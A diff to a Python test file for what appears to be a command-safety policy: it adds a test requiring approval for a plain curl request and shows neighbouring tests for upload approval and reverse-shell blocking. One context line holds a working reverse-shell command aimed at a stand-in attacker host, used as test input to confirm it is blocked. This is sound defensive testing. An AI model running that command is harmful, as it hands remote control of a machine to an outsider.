@@ -87,6 +87,12 @@ def test_outbound_upload_requires_approval():
     assert decision.rule_ids == ("egress.upload",)
 
 
+def test_plain_network_command_requires_approval():
+    decision = assess("curl https://example.com/status")
+    assert decision.action == "approve"
+    assert decision.rule_ids == ("egress.network_command",)
+
+
 def test_reverse_shell_is_blocked():
     decision = assess("bash -i >& /dev/tcp/attacker.invalid/4444 0>&1")
     assert decision.action == "block"
